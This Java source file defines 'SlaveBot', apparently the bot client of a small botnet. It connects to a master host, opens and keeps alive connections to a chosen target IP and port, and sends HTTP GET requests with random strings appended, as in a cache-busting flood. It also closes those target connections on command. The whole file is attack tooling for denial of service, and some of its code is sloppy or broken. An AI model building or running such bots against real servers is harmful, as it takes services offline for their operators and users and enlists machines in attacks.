import java.net.*;
import java.util.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.io.BufferedWriter.*;


public class SlaveBot extends Thread{


	public static ArrayList<Socket> lstconnected = new ArrayList<>();
	public static ArrayList<Socket> connected = new ArrayList<>();
	Socket attack;
	public static void main(String [] args) 
	{
		
		if(args.length != 0)
		{
			//System.out.println(args.length);
			if(args.length == 4)
			{
				listener b = new listener(Integer.parseInt(args[3]),args[1]);
			}
			else if(args.length == 3)
			{
				listener b = new listener(Integer.parseInt(args[2]),args[1]);
			}
		}
		while(true)
		{
			Scanner inp = new Scanner(System.in);
			String line = inp.nextLine();
		
			String[] arrayOfString = line.split("\\s+");
			if(arrayOfString.length == 4)
			{
				String serverName = arrayOfString[1];
				int port = Integer.parseInt(arrayOfString[3]);
				listener b = new listener(port,serverName);
			}
			else if(arrayOfString.length == 3)
			{
				String serverName = arrayOfString[1];
				int port = Integer.parseInt(arrayOfString[2]);
				listener b = new listener(port,serverName);
			}

		}
	}
		public static class listener
		{
			private int port;
			private String ip;
			public listener(int port, String ip)
			{
				this.ip = ip;
				this.port = port;
				try {
					
					Socket client = new Socket(ip, port);
					
					lstconnected.add(client);
					//System.out.println(lstconnected.size());
					System.out.println("Connected to " + client.getRemoteSocketAddress());    	
				}catch(IOException e) {
					e.printStackTrace();
					System.out.println("Terminating abnormally with exit code -1");
					System.exit(-1);
				}
			}
		}
		@SuppressWarnings("deprecation")
		public void createSocket(Socket newattack ,int port,String ip, int connections, boolean keepAlive, String url) throws IOException
		{
				
			try {
				
				attack = new Socket();
					
				attack.connect(new InetSocketAddress(ip,port));
				connected.add(attack);
		        if(attack.isConnected()){
		        	System.out.println("\nClient: "+newattack.getRemoteSocketAddress().toString()+" Connected to "+ attack.getInetAddress().toString()+"\nTarget IP: "+attack.getLocalPort()+"\n");
	        	

		        }
		        if(keepAlive)
		        {
		        	//System.out.println("inkeepalive");
		        	attack.setKeepAlive(true);
		        	System.out.println("Connectivity will be checked after 2 hrs by default\nto keep the connection alive\n");
		        }
		        if(url.length() != 0)
		        {
		        	//System.out.println("in url");
		        	DataOutputStream os = new DataOutputStream(attack.getOutputStream());
			        DataInputStream is = new DataInputStream(attack.getInputStream());
			        url = url.substring(4, url.length());
			        url = url + getRandString();
			      //  while (true)
			       // {
			            os.writeBytes("GET "+url +"HTTP/1.1\r\nHost: "+ip);
			        	// oswriteBytes("GET /index.html HTTP/1.1\r\nHost: www.google.com");
			            is.available();
			            
			        //    System.out.println(attack.getKeepAlive());
			            os.flush();
			            System.out.println(is.readLine() + "\nrandom string used "+url+"\n");
			          //  is.close();
			            Thread.sleep(1000);
			        	         
		        }
					}catch(IOException e) {
					e.printStackTrace();
					System.out.println("connection probably lost");
					System.out.println("in exception");
					System.out.println("Terminating abnormally with exit code -1");
				//	System.out.println(attack.getKeepAlive());
				//	System.exit(-1);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						//System.out.println("connection probably lost");
						e.printStackTrace();
					}
			
		
		}
		
		
		public void disconnect(int tarport, String TarAdd) {
			//	System.out.println(connected.get(0).toString());
			// System.out.println(connected.size());
			String line;
			
			try {		
				
					if(tarport == 1000)
					{
						//System.out.println("qewqwqewr");
						for(int i = 0; i < connected.size(); i++)
						{
							
						//System.out.println(connected.size()+"  "+ i);
						if(!connected.get(i).isClosed())
							{
								System.out.println("Connection to "+connected.get(i).getRemoteSocketAddress()+" "+connected.get(i).getLocalPort()+" is closed\n");
								connected.get(i).close();
								
							}
						else
							{
								System.out.println("Can't disconnect as Connection to "+connected.get(i).getRemoteSocketAddress()+" "+connected.get(i).getLocalPort()+" is closed\n");
							}
						}
					}
					else
					{
						
						for(int i = 0; i < connected.size(); i++)
						{
							
								if(connected.get(i).getLocalPort() == tarport)
								{
								
									if(!connected.get(i).isClosed())
									{
										System.out.println("Connection to "+connected.get(i).getRemoteSocketAddress()+" "+connected.get(i).getLocalPort()+" is closed\n");
										connected.get(i).close();
										
									}
									else
									{
										System.out.println("Can't disconnect as Connection to "+connected.get(i).getRemoteSocketAddress()+" "+connected.get(i).getLocalPort()+" is closed\n");
									}
								}
							
						}
					}
					
				
					}catch(IOException e) {
					e.printStackTrace();
					System.out.println("Terminating abnormally with exit code -1");
					System.exit(-1);
					}

		}
		public static String getRandString() {
		    String RANDCHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
		    StringBuilder rand = new StringBuilder();
		    Random rnd = new Random();
		    while (rand.length() < 10) {
		        int index = (int) (rnd.nextFloat() * RANDCHARS.length());
		        rand.append(RANDCHARS.charAt(index));
		    }
		    String randStr = rand.toString();
		    return randStr;

		}

}